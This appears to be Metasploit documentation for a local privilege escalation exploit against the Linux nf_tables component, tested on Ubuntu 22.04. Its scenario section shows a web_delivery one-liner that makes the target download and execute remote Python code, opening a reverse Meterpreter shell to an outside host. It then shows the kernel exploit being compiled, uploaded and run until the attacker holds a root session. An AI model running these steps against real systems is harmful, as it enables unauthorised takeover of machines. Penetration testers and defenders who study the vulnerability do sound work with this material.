## Vulnerable Application

A use-after-free vulnerability in the Linux kernels netfilter: nf_tables component can be
exploited to achieve local privilege escalation. The nft_verdict_init() function allows
positive values as drop error within the hook verdict, and hence the nf_hook_slow() function
can cause a double free vulnerability when NF_DROP is issued with a drop error which
resembles NF_ACCEPT.

Devices with a WiFi interface will likely be unstable with this exploit and crash.

Failed exploitation will likely HARD crash the system or put it into an unreliable state
and it will need a physical reset/reboot.

Tested against a VM of Ubuntu 22.04 (Linux 5.15.0-60-generic)

## Verification Steps

1. Install the application
2. Start msfconsole
3. Get an initial shell
4. Do: `use exploit/linux/local/netfilter_nf_tables_priv_esc`
5. Do: `run`
6. You should get a root shell.

## Options

## Scenarios

### Ubuntu 22.04 with kernel 5.15.0-60-generic

Get initial shell.

```
resource (netfilter)> use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
resource (netfilter)> set lhost 1.1.1.1
lhost => 1.1.1.1
resource (netfilter)> set uripath a
uripath => a
resource (netfilter)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
[*] Using URL: http://1.1.1.1:8080/a
[*] Server started.
[*] Run the following command on the target machine:
python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://1.1.1.1:8080/a', context=ssl._create_unverified_context());exec(r.read());"
[*] 2.2.2.2   web_delivery - Delivering Payload (432 bytes)
[*] Sending stage (24768 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:38082) at 2024-11-07 14:15:40 -0500
```

Privilege escalate

```
resource (netfilter)> use exploit/linux/local/netfilter_nf_tables_priv_esc
resource (netfilter)> set session 1
session => 1
resource (netfilter)> set lport 9879
lport => 9879
resource (netfilter)> set verbose true
verbose => true
resource (netfilter)> set compile True
compile => True
msf6 exploit(linux/local/netfilter_nf_tables_priv_esc) > 
msf6 exploit(linux/local/netfilter_nf_tables_priv_esc) > set session 1
session => 1
msf6 exploit(linux/local/netfilter_nf_tables_priv_esc) > exploit

[*] Started reverse TCP handler on 1.1.1.1:9879 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: python
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Kernel version 5.15.0-60-generic appears to be vulnerable
[*] Creating /tmp/.FQ977lR1fc
[*] Creating directory /tmp/.FQ977lR1fc
[*] /tmp/.FQ977lR1fc created
[+] musl-tools is installed
[*] Creating upload zip
[*] Finished creating exploit source zip, uploading...
[*] Unzipping exploit code on remote system
[*] Compiling
musl-gcc -I./include -I./include/linux-lts-6.1.72 -Wall -Wno-deprecated-declarations src/main.c src/env.c src/net.c src/nftnl.c src/file.c -o ./exploit -static ./lib/libnftnl.a ./lib/libmnl.a
src/main.c:197:13: warning: â€˜breached_the_mainframeâ€™ defined but not used [-Wunused-function]
  197 | static void breached_the_mainframe()
      |             ^~~~~~~~~~~~~~~~~~~~~~
strip ./exploit
[*] Uploading payload executable to /tmp/.FQ977lR1fc/.usnoXVKwh
[*] Writing '/tmp/.FQ977lR1fc/.usnoXVKwh' (282 bytes) ...
[*] Launching exploit...
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 2.2.2.2

[*] [*] creating user namespace (CLONE_NEWUSER)...
[*] [*] creating network namespace (CLONE_NEWNET)...
[*] [*] setting up UID namespace...
[*] [*] configuring localhost in namespace...
[*] [*] setting up nftables...
[*] [+] running normal privesc
[*] [*] waiting for the calm before the storm...
[*] [*] sending double free buffer packet...
[*] [*] spraying 16000 pte's...
[*] [*] checking 16000 sprayed pte's for overlap...
[*] [+] confirmed double alloc PMD/PTE
[*] [+] found possible physical kernel base: 000000004da00000
[*] [-] failed to find correct modprobe_path: trying to find new kernel base...
[*] [+] found possible physical kernel base: 0000000058600000
[*] [-] failed to find correct modprobe_path: trying to find new kernel base...
[*] [+] found possible physical kernel base: 000000005e400000
[*] [-] ^false positive. skipping to next one
[*] [-] ^false positive. skipping to next one
[*] [-] failed to find correct modprobe_path: trying to find new kernel base...
[*] [+] found possible physical kernel base: 0000000064400000
[*] [-] failed to find correct modprobe_path: trying to find new kernel base...
[*] [+] found possible physical kernel base: 000000006ae00000
[*] [-] ^false positive. skipping to next one
[*] [-] failed to find correct modprobe_path: trying to find new kernel base...
[*] [+] found possible physical kernel base: 0000000087200000
[*] [-] ^false positive. skipping to next one
[*] [-] failed to find correct modprobe_path: trying to find new kernel base...
[*] [+] found possible physical kernel base: 000000008d000000
[*] [-] ^false positive. skipping to next one
[*] [-] ^false positive. skipping to next one
[*] [-] ^false positive. skipping to next one
[*] [-] failed to find correct modprobe_path: trying to find new kernel base...
[*] [+] found possible physical kernel base: 0000000090800000
[*] [-] ^false positive. skipping to next one
[*] [-] ^false positive. skipping to next one
[*] [-] failed to find correct modprobe_path: trying to find new kernel base...
[*] [+] found possible physical kernel base: 000000009da00000
[*] [-] failed to find correct modprobe_path: trying to find new kernel base...
[*] [+] found possible physical kernel base: 00000000a2e00000
[*] [-] ^false positive. skipping to next one
[*] [-] ^false positive. skipping to next one
[*] 2.2.2.2 - Meterpreter session 1 closed.  Reason: Died


[*] Meterpreter session 2 opened (1.1.1.1:9879 -> 2.2.2.2:46390) at 2024-11-07 14:21:32 -0500
[-] exploit: Interrupted
msf6 exploit(linux/local/netfilter_nf_tables_priv_esc) > 
msf6 exploit(linux/local/netfilter_nf_tables_priv_esc) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 2.2.2.2
OS           : Ubuntu 22.04 (Linux 5.15.0-60-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
```
